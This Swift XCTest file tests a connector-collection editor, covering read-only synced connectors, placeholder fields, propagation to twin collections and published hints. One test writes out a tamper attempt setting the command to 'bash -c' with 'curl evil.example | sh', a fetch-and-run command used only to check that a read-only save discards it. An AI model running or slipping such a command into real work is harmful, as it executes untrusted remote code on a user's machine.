import XCTest
import ConnectorControlCore
import ConnectorControlTestSupport
@testable import ConnectorControlState

/// Mirror: windows/tests/ConnectorControl.Core.Tests/State/EditorModelCollectionsTests.cs.
/// The editor once it knows which collection it is editing: the four header states, a synced
/// connector's read-only form with its placeholders still live, and the propagate line.
@MainActor
final class EditorModelCollectionsTests: XCTestCase {
    /// Subscribes the rig's state to the sample document on disk, so "Data team" is a real
    /// synced collection with a marker in an env value, in an argument and in a bearer token.
    @discardableResult
    private func subscribeToDataTeam(_ rig: EditorRig) throws -> URL {
        try rig.h.subscribe(rig.state, to: CollectionDocumentSamples.dataTeam, at: "shared/data-team.json")
    }

    private func envRow(_ editor: EditorModel, _ name: String) throws -> EnvRow {
        try XCTUnwrap(editor.envRows.first { $0.name == name }, "no env row named \(name)")
    }

    // MARK: - Read-only

    func testASyncedConnectorOpensReadOnlyWithLivePlaceholders() throws {
        let rig = EditorRig()
        defer { rig.dispose() }
        try subscribeToDataTeam(rig)

        let dbt = rig.editor("dbt", in: "Data team")
        XCTAssertTrue(dbt.isReadOnly)
        XCTAssertEqual(dbt.headerState, .synced(collection: "Data team"))
        XCTAssertEqual(dbt.headerNote, "Synced from Data team · read-only")
        XCTAssertTrue(dbt.canSave, "the placeholder fields are editable, so Save stays enabled")
        XCTAssertFalse(dbt.showJSONTip, "the paste tip offers something a read-only JSON view cannot do")

        let token = try envRow(dbt, "DBT_TOKEN")
        XCTAssertTrue(dbt.isPlaceholder(envRow: token.id))
        XCTAssertEqual(dbt.placeholderHint(envRow: token.id), "cloud.getdbt.com ▸ API tokens")
        let region = try envRow(dbt, "DBT_REGION")
        XCTAssertFalse(dbt.isPlaceholder(envRow: region.id), "a shared value is not asking for anything")
        XCTAssertNil(dbt.placeholderHint(envRow: region.id))
        XCTAssertEqual(dbt.argsWithPlaceholders, [], "dbt's arguments are the author's own")

        let ledger = rig.editor("ledger", in: "Data team")
        XCTAssertEqual(ledger.argsWithPlaceholders, [0])
        XCTAssertEqual(ledger.placeholderHint(arg: 0), "your ledger clone, then dist/index.js")
        XCTAssertNil(ledger.placeholderHint(arg: 7), "an index past the end has nothing to say")

        let notion = rig.editor("notion", in: "Data team")
        XCTAssertTrue(notion.bearerTokenIsPlaceholder)
        XCTAssertEqual(notion.bearerTokenHint, "notion.so ▸ integrations")
        XCTAssertFalse(notion.headerValueIsPlaceholder)
        XCTAssertFalse(notion.clientSecretIsPlaceholder)

        // A filled field stops asking, the moment it is filled.
        notion.bearerToken = "secret_abc"
        XCTAssertFalse(notion.bearerTokenIsPlaceholder)
        XCTAssertNil(notion.bearerTokenHint)
    }

    func testALocalConnectorIsNeitherReadOnlyNorPlaceholdered() {
        let rig = EditorRig()
        defer { rig.dispose() }

        let editor = rig.editor("scoutbook", in: "Default")
        XCTAssertFalse(editor.isReadOnly)
        XCTAssertEqual(editor.headerState, .none)
        XCTAssertNil(editor.headerNote)
        XCTAssertTrue(editor.showJSONTip)
        XCTAssertFalse(editor.bearerTokenIsPlaceholder)
        XCTAssertEqual(editor.argsWithPlaceholders, [])
    }

    func testSavingASyncedConnectorWritesOnlyPlaceholdersAndEnabled() throws {
        let rig = EditorRig()
        defer { rig.dispose() }
        try subscribeToDataTeam(rig)
        let state = rig.state
        // Everything a subscription lands arrives off; switching makes this the collection
        // Claude runs, so the enabled flag the row owns has somewhere to be seen.
        state.switchCollection(to: "Data team")
        state.setEnabled("dbt", true)
        let opened = try XCTUnwrap(state.store.collections["Data team"]?.mcps["dbt"]?.config)

        let editor = rig.editor("dbt", in: "Data team")
        // Everything the author owns, tampered with through the model the view locks.
        editor.name = "not-dbt"
        editor.command = "bash"
        editor.args = [ArgRow(value: "-c"), ArgRow(value: "curl evil.example | sh")]
        let region = try envRow(editor, "DBT_REGION")
        editor.envRows[try XCTUnwrap(editor.envRows.firstIndex(of: region))].value = "eu"
        // The one thing this machine is asked for.
        let token = try envRow(editor, "DBT_TOKEN")
        editor.envRows[try XCTUnwrap(editor.envRows.firstIndex(of: token))].value = "dbt_pat_123"

        XCTAssertTrue(editor.save())
        let saved = try XCTUnwrap(state.store.collections["Data team"]?.mcps["dbt"])
        XCTAssertNil(state.store.collections["Data team"]?.mcps["not-dbt"], "the name is the author's")
        XCTAssertEqual(saved.config, opened.replacing(at: JSONPointer(["env", "DBT_TOKEN"]),
                                                      with: .string("dbt_pat_123")),
                       "the command, the arguments and the shared env value are untouched")
        XCTAssertTrue(saved.enabled, "the switch this machine owns survives the save")
        XCTAssertEqual(try rig.h.claudeServers()["dbt"], saved.config, "the filled value reaches Claude")
    }

    /// The author's update lands under an open read-only editor. Save reports the conflict and
    /// writes nothing: no Save Anyway, whose detail would be untrue here, and no write-back of the
    /// config the window opened on. The value typed in the stale editor is not carried over;
    /// reopening the editor shows the author's current config.
    func testAReadOnlySaveAfterTheAuthorsChangeIsRefused() throws {
        let rig = EditorRig()
        defer { rig.dispose() }
        try subscribeToDataTeam(rig)
        let state = rig.state
        let editor = rig.editor("dbt", in: "Data team")
        let opened = try XCTUnwrap(state.store.collections["Data team"]?.mcps["dbt"])
        let changed = try XCTUnwrap(opened.config.replacing(at: JSONPointer(["env", "DBT_REGION"]), with: .string("ap")))
        XCTAssertNil(state.upsert(name: "dbt", entry: MCPEntry(enabled: opened.enabled, config: changed),
                                  renamedFrom: "dbt", in: "Data team"))
        let token = try envRow(editor, "DBT_TOKEN")
        editor.envRows[try XCTUnwrap(editor.envRows.firstIndex(of: token))].value = "dbt_pat_123"

        XCTAssertFalse(editor.save())
        XCTAssertEqual(editor.validationError, EditorModel.changedOutsideMessage("dbt"))
        XCTAssertEqual(rig.h.dialogs.confirms, [], "no Save Anyway: its detail would be untrue here")
        XCTAssertEqual(state.store.collections["Data team"]?.mcps["dbt"]?.config, changed,
                       "the author's change stands, and nothing typed in the stale editor lands")
    }

    /// The author removed the connector under an open read-only editor. Save reports the conflict
    /// and writes nothing, rather than offering to add the author's connector back.
    func testAReadOnlySaveAfterTheAuthorRemovedTheConnectorDoesNotResurrectIt() throws {
        let rig = EditorRig()
        defer { rig.dispose() }
        try subscribeToDataTeam(rig)
        let state = rig.state
        let editor = rig.editor("dbt", in: "Data team")
        state.remove(names: ["dbt"], in: "Data team")
        let token = try envRow(editor, "DBT_TOKEN")
        editor.envRows[try XCTUnwrap(editor.envRows.firstIndex(of: token))].value = "dbt_pat_123"

        XCTAssertFalse(editor.save())
        XCTAssertEqual(editor.validationError, EditorModel.removedOutsideMessage("dbt"))
        XCTAssertEqual(rig.h.dialogs.confirms, [], "no Save Anyway: it would add the author's connector back")
        XCTAssertNil(state.store.collections["Data team"]?.mcps["dbt"])
    }

    func testASyncedSaveInAnInactiveCollectionPersistsWithoutTouchingClaude() throws {
        let rig = EditorRig()
        defer { rig.dispose() }
        try subscribeToDataTeam(rig)
        let state = rig.state
        XCTAssertEqual(state.activeCollection, "Default")
        let before = try rig.h.claudeServers()

        let editor = rig.editor("ledger", in: "Data team")
        editor.args[0].value = "/Users/me/ledger/dist/index.js"
        XCTAssertTrue(editor.save())

        XCTAssertEqual(state.store.collections["Data team"]?.mcps["ledger"]?.config
            .value(at: JSONPointer(["args", "0"])), .string("/Users/me/ledger/dist/index.js"))
        XCTAssertEqual(try rig.h.claudeServers(), before, "Claude runs the active collection and nothing else")
        XCTAssertEqual(try rig.h.storeOnDisk().collections["Data team"]?.mcps["ledger"]?.config,
                       state.store.collections["Data team"]?.mcps["ledger"]?.config, "it is on disk all the same")
    }

    func testAReadOnlySaveFillsAMarkerWhereverItSits() throws {
        let rig = EditorRig()
        defer { rig.dispose() }
        // A remote connector's secret is never a leaf of its own: a bearer token rides in the env
        // value the --header flag indirects through, and a client secret inside a JSON blob in an
        // argument. Both reach the user through the local form, because a bridge invocation
        // carrying auth flags is not the canonical two-argument shape the remote form detects.
        var doc = CollectionDocumentSamples.dataTeam
        doc.connectors["billing"] = .init(
            launcher: .remote(.init(url: "https://mcp.billing.example/",
                                    auth: .oauthClient(clientId: "cc-app", scopes: "read"),
                                    package: "mcp-remote", extraArgs: [])),
            env: [:], needs: ["client_secret": "the billing console"], additional: [:])
        let state = rig.state
        try rig.h.subscribe(state, to: doc, at: "shared/data-team.json")

        let notion = rig.editor("notion", in: "Data team")
        XCTAssertFalse(notion.isRemote, "the --header flags take it out of the remote form")
        XCTAssertTrue(notion.bearerTokenIsPlaceholder, "the decoded token is a marker all the same")
        XCTAssertEqual(notion.bearerTokenHint, "notion.so ▸ integrations")
        let openedNotion = try XCTUnwrap(state.store.collections["Data team"]?.mcps["notion"]?.config)
        let header = try envRow(notion, "AUTH_HEADER")
        XCTAssertTrue(notion.isPlaceholder(envRow: header.id))
        notion.envRows[try XCTUnwrap(notion.envRows.firstIndex(of: header))].value = "Bearer secret_abc"
        notion.command = "bash"
        XCTAssertTrue(notion.save())
        let savedNotion = try XCTUnwrap(state.store.collections["Data team"]?.mcps["notion"]?.config)
        XCTAssertEqual(savedNotion.value(at: JSONPointer(["env", "AUTH_HEADER"])), .string("Bearer secret_abc"))
        assertOnlyMarkedLeavesMoved(from: openedNotion, to: savedNotion)

        let billing = rig.editor("billing", in: "Data team")
        XCTAssertTrue(billing.clientSecretIsPlaceholder)
        XCTAssertEqual(billing.clientSecretHint, "the billing console")
        let openedBilling = try XCTUnwrap(state.store.collections["Data team"]?.mcps["billing"]?.config)
        let blob = try XCTUnwrap(billing.argsWithPlaceholders.first)
        XCTAssertEqual(billing.argsWithPlaceholders, [blob])
        XCTAssertEqual(billing.placeholderHint(arg: blob), "the billing console")
        billing.args[blob].value = #"{"client_id":"cc-app","client_secret":"shh"}"#
        XCTAssertTrue(billing.save())
        let savedBilling = try XCTUnwrap(state.store.collections["Data team"]?.mcps["billing"]?.config)
        XCTAssertEqual(savedBilling.value(at: JSONPointer(["args", String(blob)])),
                       .string(#"{"client_id":"cc-app","client_secret":"shh"}"#))
        assertOnlyMarkedLeavesMoved(from: openedBilling, to: savedBilling)
    }

    /// Every string in the config as it opened that was not a marker is still exactly where and
    /// what the author left it.
    private func assertOnlyMarkedLeavesMoved(from opened: JSONValue, to saved: JSONValue,
                                             file: StaticString = #filePath, line: UInt = #line) {
        for leaf in opened.stringLeaves where !Placeholder.containsMarker(leaf.value) {
            XCTAssertEqual(saved.value(at: leaf.pointer), .string(leaf.value),
                           "\(leaf.pointer) moved", file: file, line: line)
        }
    }

    // MARK: - Header states

    func testHeaderStatesFollowTheCollection() throws {
        let rig = EditorRig()
        defer { rig.dispose() }
        try subscribeToDataTeam(rig)
        let state = rig.state

        XCTAssertEqual(rig.editor("scoutbook", in: "Default").headerState, .none)
        XCTAssertEqual(rig.editor("dbt", in: "Data team").headerState, .synced(collection: "Data team"))

        XCTAssertNil(state.makeLocalCopy(of: ["dbt"], from: "Data team", into: "Default"))
        let date = try XCTUnwrap(state.collectionsFile.collections["Default"]?.provenance["dbt"]?.date)
        let imported = rig.editor("dbt", in: "Default")
        XCTAssertEqual(imported.headerState, .imported(from: "Data team", date: date))
        XCTAssertEqual(imported.headerNote, "Imported from “Data team” on \(date). Edits stay here.")
        XCTAssertFalse(imported.isReadOnly, "a copy is the user's own")

        XCTAssertNil(state.createCollection(named: "Team"))
        let folder = try rig.h.publish(state, "Team", folder: "share").deletingLastPathComponent()
        let published = rig.editor("scoutbook", in: "Team")
        XCTAssertEqual(published.headerState, .published(folder: folder.path))
        XCTAssertEqual(published.headerNote,
                       "Published to \(folder.path) — saving updates the file your team reads. Secrets stay here.")
        XCTAssertFalse(published.isReadOnly)
    }

    // MARK: - Propagate

    /// More than one twin takes the plural verb.
    func testThePropagateLabelAgreesWithHowManyTwinsThereAre() {
        let rig = EditorRig()
        defer { rig.dispose() }
        rig.twin("Backup")
        rig.twin("Spare")
        XCTAssertEqual(rig.editor("scoutbook", in: "Default").propagateMessage,
                       "Also apply this change to Backup, Spare, which have an identical scoutbook")
    }

    func testPropagateAppliesTheChangeToIdenticalTwins() throws {
        let rig = EditorRig()
        defer { rig.dispose() }
        let state = rig.state
        rig.twin("Backup")
        state.setEnabled("scoutbook", false, in: "Backup")

        let editor = rig.editor("scoutbook", in: "Default")
        XCTAssertEqual(editor.propagateTargets, ["Backup"])
        XCTAssertTrue(editor.showPropagate)
        XCTAssertFalse(editor.propagate, "off unless the user ticks it")
        XCTAssertEqual(editor.propagateMessage, "Also apply this change to Backup, which has an identical scoutbook")

        editor.propagate = true
        editor.remoteURL = "https://scoutbook.example.com/mcp/v2"
        XCTAssertTrue(editor.save())

        let updated = try XCTUnwrap(state.store.collections["Default"]?.mcps["scoutbook"])
        XCTAssertTrue(updated.config.editorText().contains("/mcp/v2"))
        XCTAssertEqual(state.store.collections["Backup"]?.mcps["scoutbook"]?.config, updated.config)
        XCTAssertEqual(state.store.collections["Backup"]?.mcps["scoutbook"]?.enabled, false,
                       "the twin's own on/off state is not part of the change")
        XCTAssertTrue(updated.enabled)
    }

    func testAnUntickedPropagateLeavesTheTwinAlone() throws {
        let rig = EditorRig()
        defer { rig.dispose() }
        let state = rig.state
        rig.twin("Backup")
        let twin = try XCTUnwrap(state.store.collections["Backup"]?.mcps["scoutbook"]?.config)

        let editor = rig.editor("scoutbook", in: "Default")
        editor.remoteURL = "https://scoutbook.example.com/mcp/v2"
        XCTAssertTrue(editor.save())

        XCTAssertEqual(state.store.collections["Backup"]?.mcps["scoutbook"]?.config, twin)
    }

    func testPropagateSkipsATwinThatMovedWhileTheWindowWasOpen() throws {
        let rig = EditorRig()
        defer { rig.dispose() }
        let state = rig.state
        rig.twin("Backup")

        let editor = rig.editor("scoutbook", in: "Default")
        XCTAssertEqual(editor.propagateTargets, ["Backup"])
        // A second window on the twin saved first — the checkbox's promise no longer holds for it.
        let moved = MCPEntry(config: AppStateHarness.remote("https://scoutbook.example.com/mcp/other"))
        XCTAssertNil(state.upsert(name: "scoutbook", entry: moved, renamedFrom: "scoutbook", in: "Backup"))

        editor.propagate = true
        editor.remoteURL = "https://scoutbook.example.com/mcp/v2"
        XCTAssertTrue(editor.save())

        XCTAssertEqual(state.store.collections["Backup"]?.mcps["scoutbook"]?.config, moved.config,
                       "a twin that is no longer identical keeps what it says")
        XCTAssertTrue(try XCTUnwrap(state.store.collections["Default"]?.mcps["scoutbook"]?.config)
            .editorText().contains("/mcp/v2"), "the save itself still lands")
    }

    func testPropagatingIntoTheActiveCollectionReachesClaudeOnce() throws {
        let rig = EditorRig()
        defer { rig.dispose() }
        let state = rig.state
        // Edit the inactive side and propagate inward: the twin Claude runs is the one that moves.
        rig.twin("Spare")
        let appliedBefore = rig.h.settings.lastApplyDate

        let editor = rig.editor("scoutbook", in: "Spare")
        XCTAssertEqual(editor.propagateTargets, ["Default"])
        editor.propagate = true
        editor.remoteURL = "https://scoutbook.example.com/mcp/v2"
        rig.h.now = rig.h.now.addingTimeInterval(60)
        XCTAssertTrue(editor.save())

        let updated = try XCTUnwrap(state.store.collections["Default"]?.mcps["scoutbook"]?.config)
        XCTAssertTrue(updated.editorText().contains("/mcp/v2"))
        XCTAssertEqual(try rig.h.claudeServers()["scoutbook"], updated, "Claude follows the active collection")
        XCTAssertNotEqual(rig.h.settings.lastApplyDate, appliedBefore, "the save applied")
        XCTAssertEqual(rig.h.settings.lastApplyDate, rig.h.now)
        // One apply, and it came after every write: an apply that ran before the propagated
        // collection was written would leave the store dirty behind it.
        XCTAssertFalse(state.isDirty)
        XCTAssertEqual(state.store.collections["Spare"]?.mcps["scoutbook"]?.config, updated)
    }

    func testPropagateCarriesARenameToTheTwin() throws {
        let rig = EditorRig()
        defer { rig.dispose() }
        let state = rig.state
        rig.twin("Backup")

        let editor = rig.editor("scoutbook", in: "Default")
        editor.propagate = true
        editor.name = "scouts"
        XCTAssertTrue(editor.save())

        XCTAssertNil(state.store.collections["Backup"]?.mcps["scoutbook"])
        XCTAssertNotNil(state.store.collections["Backup"]?.mcps["scouts"])
        XCTAssertNil(state.store.collections["Default"]?.mcps["scoutbook"])
        XCTAssertNotNil(state.store.collections["Default"]?.mcps["scouts"])
    }

    func testPropagateLeavesACollectionWhoseNewNameIsTakenAlone() throws {
        let rig = EditorRig()
        defer { rig.dispose() }
        let state = rig.state
        rig.twin("Backup")
        // "Backup" already has something called "scouts", so the rename cannot land there.
        let occupant = MCPEntry(config: AppStateHarness.remote("https://scouts.example/mcp"))
        XCTAssertNil(state.upsert(name: "scouts", entry: occupant, renamedFrom: nil, in: "Backup"))

        let editor = rig.editor("scoutbook", in: "Default")
        editor.propagate = true
        editor.name = "scouts"
        XCTAssertTrue(editor.save(), "the save the user asked for still lands")

        XCTAssertEqual(state.store.collections["Backup"]?.mcps["scouts"]?.config, occupant.config,
                       "the name was taken, so that collection is left as it was")
        XCTAssertNotNil(state.store.collections["Backup"]?.mcps["scoutbook"])
        XCTAssertNotNil(state.store.collections["Default"]?.mcps["scouts"])
    }

    func testPropagateIsOfferedOnlyForIdenticalLocalTwins() throws {
        let rig = EditorRig()
        defer { rig.dispose() }
        try subscribeToDataTeam(rig)
        let state = rig.state

        // A twin whose config has moved on is not the same connector any more.
        XCTAssertNil(state.createCollection(named: "Other"))
        state.switchCollection(to: "Default")
        XCTAssertNil(state.upsert(name: "scoutbook",
                                  entry: MCPEntry(config: AppStateHarness.remote("https://elsewhere.example/mcp")),
                                  renamedFrom: "scoutbook", in: "Other"))
        let editor = rig.editor("scoutbook", in: "Default")
        XCTAssertEqual(editor.propagateTargets, [])
        XCTAssertFalse(editor.showPropagate)

        // A synced collection holding the very same connector is never a propagate target, in
        // either direction: its copy belongs to its author.
        XCTAssertNil(state.makeLocalCopy(of: ["notion"], from: "Data team", into: "Default"))
        XCTAssertEqual(rig.editor("notion", in: "Default").propagateTargets, [])
        XCTAssertEqual(rig.editor("notion", in: "Data team").propagateTargets, [])

        XCTAssertEqual(rig.editor(EditTarget.new(template: rig.local("node", ["x.js"]))).propagateTargets, [],
                       "a connector that does not exist yet has no twins")
    }

    // MARK: - Targets

    func testATargetNamesItsCollectionAndOpensItsOwnWindow() {
        let entry = MCPEntry(config: AppStateHarness.remote("https://x.example/mcp"))
        let active = EditTarget.existing(name: "x", entry: entry, in: "Default")
        let team = EditTarget.existing(name: "x", entry: entry, in: "Team")
        XCTAssertEqual(active.collection, "Default")
        XCTAssertEqual(team.collection, "Team")
        XCTAssertEqual(active.id, "Default\u{001F}x", "the collection is part of the identity, the active one's too")
        XCTAssertNotEqual(team.id, active.id)
        XCTAssertNotEqual(team, active)
        XCTAssertEqual(EditTarget.newRemote(in: "Team").collection, "Team")

        // The same connector in the same collection is the same window, however its entry has
        // changed since: a click on its row brings the open editor forward.
        var switchedOff = entry
        switchedOff.enabled = false
        let again = EditTarget.existing(name: "x", entry: switchedOff, in: "Default")
        XCTAssertEqual(again, active)
        XCTAssertEqual(again.hashValue, active.hashValue)
        XCTAssertNotEqual(EditTarget.newRemote(in: "Team"), EditTarget.newRemote(in: "Team"))
    }
    // MARK: - The open-time snapshot

    func testWhatAFieldWasAskingForIsFixedWhenTheWindowOpens() throws {
        let rig = EditorRig()
        defer { rig.dispose() }
        try subscribeToDataTeam(rig)

        let dbt = rig.editor("dbt", in: "Data team")
        let token = try envRow(dbt, "DBT_TOKEN")
        XCTAssertTrue(dbt.asksFor(envRow: token.id))
        XCTAssertTrue(dbt.isPlaceholder(envRow: token.id))
        // Filling it answers the question; it does not hand the field back to the lock.
        let index = try XCTUnwrap(dbt.envRows.firstIndex { $0.id == token.id })
        dbt.envRows[index].value = "secret_abc"
        XCTAssertFalse(dbt.isPlaceholder(envRow: token.id))
        XCTAssertTrue(dbt.asksFor(envRow: token.id), "the field being typed into stays the live one")
        // A row that was not asking never becomes live, whatever is typed into it.
        let region = try envRow(dbt, "DBT_REGION")
        XCTAssertFalse(dbt.asksFor(envRow: region.id))

        let ledger = rig.editor("ledger", in: "Data team")
        XCTAssertEqual(ledger.argsWithPlaceholders, [0])
        XCTAssertTrue(ledger.asksFor(arg: 0))
        ledger.args[0].value = "/Users/d/ledger/dist/index.js"
        XCTAssertEqual(ledger.argsWithPlaceholders, [])
        XCTAssertTrue(ledger.asksFor(arg: 0))
        XCTAssertFalse(ledger.asksFor(arg: 7), "an index past the end asks for nothing")
        // Keyed by the row, not the position: a row inserted above carries the answer with it.
        ledger.args.insert(ArgRow(value: "--quiet"), at: 0)
        XCTAssertFalse(ledger.asksFor(arg: 0))
        XCTAssertTrue(ledger.asksFor(arg: 1))

        let notion = rig.editor("notion", in: "Data team")
        XCTAssertTrue(notion.asksForBearerToken)
        notion.bearerToken = "secret_abc"
        XCTAssertFalse(notion.bearerTokenIsPlaceholder, "the ring and the hint follow the text")
        XCTAssertTrue(notion.asksForBearerToken, "the lock does not")
        XCTAssertFalse(notion.asksForHeaderValue)
        XCTAssertFalse(notion.asksForClientSecret)
    }

    /// Owed: asked for when the window opened, and either still the author's marker or emptied
    /// since. What the caution ring and the phrase under a field follow.
    func testAValueIsOwedWhileItsMarkerStandsAndAgainOnceEmptied() throws {
        let rig = EditorRig()
        defer { rig.dispose() }
        try subscribeToDataTeam(rig)

        let dbt = rig.editor("dbt", in: "Data team")
        let token = try envRow(dbt, "DBT_TOKEN")
        let tokenIndex = try XCTUnwrap(dbt.envRows.firstIndex { $0.id == token.id })
        XCTAssertTrue(dbt.isOwed(envRow: token.id))
        dbt.envRows[tokenIndex].value = "secret_abc"
        XCTAssertFalse(dbt.isOwed(envRow: token.id))
        dbt.envRows[tokenIndex].value = ""
        XCTAssertTrue(dbt.isOwed(envRow: token.id), "emptied, it owes again")
        let region = try envRow(dbt, "DBT_REGION")
        let regionIndex = try XCTUnwrap(dbt.envRows.firstIndex { $0.id == region.id })
        dbt.envRows[regionIndex].value = ""
        XCTAssertFalse(dbt.isOwed(envRow: region.id), "a field that never asked owes nothing, empty or not")

        let ledger = rig.editor("ledger", in: "Data team")
        XCTAssertTrue(ledger.isOwed(arg: 0))
        ledger.args[0].value = "/Users/d/ledger/dist/index.js"
        XCTAssertFalse(ledger.isOwed(arg: 0))
        ledger.args[0].value = ""
        XCTAssertTrue(ledger.isOwed(arg: 0))
        XCTAssertFalse(ledger.isOwed(arg: 7), "an index past the end owes nothing")

        let notion = rig.editor("notion", in: "Data team")
        XCTAssertTrue(notion.bearerTokenOwed)
        notion.bearerToken = "secret_abc"
        XCTAssertFalse(notion.bearerTokenOwed)
        notion.bearerToken = ""
        XCTAssertTrue(notion.bearerTokenOwed)
        notion.headerValue = ""
        XCTAssertFalse(notion.headerValueOwed)
        notion.oauthClientSecret = ""
        XCTAssertFalse(notion.clientSecretOwed)
    }

    // MARK: - Published hints

    func testAPublishedConnectorCarriesTheAuthorsHintForEachStrippedValue() throws {
        let rig = EditorRig()
        defer { rig.dispose() }
        let state = rig.state
        XCTAssertNil(state.createCollection(named: "Team"))
        XCTAssertNil(state.upsert(name: "svc", entry: MCPEntry(config: .object([
            "command": .string("node"),
            "args": .array([.string("/Users/d/server.js")]),
            "env": .object(["TOKEN": .string("sk-live"), "REGION": .string("us")]),
        ])), renamedFrom: nil, in: "Team"))
        let intent = PublishIntent(
            shareValues: ["svc": ["REGION"]],
            pathMarks: ["svc": [JSONPointer(["args", "0"]): .init(name: "server_path", hint: "your clone, then dist/index.js",
                                                                  value: "/Users/d/server.js")]],
            hints: ["svc": ["TOKEN": "acme.example ▸ API tokens"]])
        try rig.h.publish(state, "Team", intent: intent, folder: "share")

        let editor = rig.editor("svc", in: "Team")
        XCTAssertTrue(editor.hasPublishedHints)
        let token = try envRow(editor, "TOKEN")
        XCTAssertEqual(editor.publishedHint(envRow: token.id), "acme.example ▸ API tokens")
        // A shared value is not stripped, so the author owes no explanation for it.
        let region = try envRow(editor, "REGION")
        XCTAssertNil(editor.publishedHint(envRow: region.id))
        XCTAssertEqual(editor.publishedHint(arg: 0), "your clone, then dist/index.js")
        XCTAssertNil(editor.publishedHint(arg: 7))

        // A published collection's editor adds and removes arguments freely, and the record
        // keys the hint by where the marker sat, so the answer follows the row rather than the
        // position it happens to hold now.
        editor.args.insert(ArgRow(value: "--quiet"), at: 0)
        XCTAssertNil(editor.publishedHint(arg: 0), "a row added since the window opened")
        XCTAssertEqual(editor.publishedHint(arg: 1), "your clone, then dist/index.js")
        editor.args.remove(at: 0)
        XCTAssertEqual(editor.publishedHint(arg: 0), "your clone, then dist/index.js")
        // A different question from the synced sidecar's needs, which say nothing here.
        XCTAssertNil(editor.placeholderHint(envRow: token.id))

        // A local collection nobody publishes has none of this to say.
        let plain = rig.editor("scoutbook", in: "Default")
        XCTAssertFalse(plain.hasPublishedHints)
        XCTAssertNil(plain.publishedHint(arg: 0))

        // The record without this machine's binding is another machine's publish, and the hints
        // are that machine's business, not this editor's.
        try CollectionsLocalCache(synced: [:], published: [:])
            .save(to: state.service.paths.collectionsCacheURL, staging: nil)
        state.reload()
        let elsewhere = rig.editor("svc", in: "Team")
        XCTAssertTrue(state.isPublished("Team"), "the sidecar still carries the record")
        XCTAssertFalse(elsewhere.hasPublishedHints)
        XCTAssertNil(elsewhere.publishedHint(envRow: try envRow(elsewhere, "TOKEN").id))
        XCTAssertNil(elsewhere.publishedHint(arg: 0))
    }
    func testStopSyncingRetakesTheSnapshotSoAFilledSecretIsMaskedAgain() throws {
        let rig = EditorRig()
        defer { rig.dispose() }
        try subscribeToDataTeam(rig)
        let notion = rig.editor("notion", in: "Data team")
        XCTAssertTrue(notion.isReadOnly)
        XCTAssertTrue(notion.asksForBearerToken)

        // Filled while the form still locks everything else: the field stays the live one, so
        // the user can keep typing into it.
        notion.bearerToken = "secret_abc"
        XCTAssertTrue(notion.asksForBearerToken)

        // Stop Syncing turns the whole form into an ordinary editable one. What the user filled
        // is now an ordinary secret and must stop being rendered in the clear.
        rig.state.stopSyncing("Data team")
        XCTAssertFalse(notion.isReadOnly)
        XCTAssertFalse(notion.asksForBearerToken, "nothing is owed, so nothing is unmasked")

        // A field still holding its marker is still owed, locked form or not.
        let dbt = rig.editor("dbt", in: "Data team")
        let token = try envRow(dbt, "DBT_TOKEN")
        XCTAssertFalse(dbt.isReadOnly, "the collection is local now")
        XCTAssertTrue(dbt.asksFor(envRow: token.id))
        XCTAssertTrue(dbt.isPlaceholder(envRow: token.id))
    }
    // MARK: - A JSON round trip keeps both records

    func testAJSONRoundTripKeepsWhatASyncedFormAskedFor() throws {
        let rig = EditorRig()
        defer { rig.dispose() }
        try subscribeToDataTeam(rig)

        // The round trip rebuilds every row; the record has to recognise the rebuilt ones.
        let dbt = rig.editor("dbt", in: "Data team")
        dbt.requestView(.json)
        dbt.requestView(.form)
        XCTAssertEqual(dbt.view, .form)
        XCTAssertTrue(dbt.asksFor(envRow: try envRow(dbt, "DBT_TOKEN").id),
                      "the placeholder field stays live, so the value can still be filled")
        XCTAssertFalse(dbt.asksFor(envRow: try envRow(dbt, "DBT_REGION").id))

        let ledger = rig.editor("ledger", in: "Data team")
        ledger.requestView(.json)
        ledger.requestView(.form)
        XCTAssertTrue(ledger.asksFor(arg: 0))

        // Carried, not retaken: a value filled before the trip keeps its field live.
        let index = try XCTUnwrap(dbt.envRows.firstIndex { $0.name == "DBT_TOKEN" })
        dbt.envRows[index].value = "secret_abc"
        dbt.requestView(.json)
        dbt.requestView(.form)
        XCTAssertTrue(dbt.asksFor(envRow: try envRow(dbt, "DBT_TOKEN").id))

        // The auth flags are not row-keyed, so a round trip has nothing to carry for them.
        let notion = rig.editor("notion", in: "Data team")
        notion.requestView(.json)
        notion.requestView(.form)
        XCTAssertTrue(notion.asksForBearerToken)
    }

    func testAJSONRoundTripKeepsAPublishedArgumentsHint() throws {
        let rig = EditorRig()
        defer { rig.dispose() }
        let state = rig.state
        XCTAssertNil(state.createCollection(named: "Team"))
        XCTAssertNil(state.upsert(name: "svc", entry: MCPEntry(config: .object([
            "command": .string("node"),
            "args": .array([.string("/Users/d/server.js")]),
        ])), renamedFrom: nil, in: "Team"))
        let intent = PublishIntent(
            shareValues: [:],
            pathMarks: ["svc": [JSONPointer(["args", "0"]): .init(name: "server_path", hint: "your clone", value: "/Users/d/server.js")]],
            hints: [:])
        try rig.h.publish(state, "Team", intent: intent, folder: "share")

        let editor = rig.editor("svc", in: "Team")
        XCTAssertEqual(editor.publishedHint(arg: 0), "your clone")
        editor.requestView(.json)
        editor.requestView(.form)
        XCTAssertEqual(editor.publishedHint(arg: 0), "your clone", "the hint survives an unchanged round trip")
    }

    // MARK: - Saving a published connector moves its path marks with their rows

    private let serverPath = "/Users/d/server.js"

    /// "Team" publishing `svc`, whose arguments are `args` with the server path marked the way
    /// the Publish sheet records it. Returns the document's path.
    @discardableResult
    private func publishTeam(_ rig: EditorRig, args: [String]) throws -> URL {
        let state = rig.state
        XCTAssertNil(state.createCollection(named: "Team"))
        XCTAssertNil(state.upsert(name: "svc", entry: MCPEntry(config: rig.local("node", args)), renamedFrom: nil, in: "Team"))
        let index = try XCTUnwrap(args.firstIndex(of: serverPath))
        return try rig.h.publish(state, "Team", intent: PublishIntent(
            shareValues: [:], pathMarks: ["svc": mark(at: index, value: serverPath)], hints: [:]), folder: "share")
    }

    private func mark(at index: Int, value: String) -> [JSONPointer: PublishIntent.PathMark] {
        [JSONPointer(["args", String(index)]): .init(name: "server_path", hint: "your clone", value: value)]
    }

    private func marks(_ rig: EditorRig, _ connector: String = "svc", in collection: String = "Team")
        -> [JSONPointer: PublishIntent.PathMark]? {
        rig.state.collectionsFile.collections[collection]?.publish?.intent.pathMarks[connector]
    }

    private func publishedArgs(_ file: URL, _ connector: String = "svc") throws -> [String] {
        let document = try CollectionDocument.decode(try Data(contentsOf: file))
        guard case .local(let local)? = document.connectors[connector]?.launcher else {
            throw AppStateHarness.HarnessError()
        }
        return local.args
    }

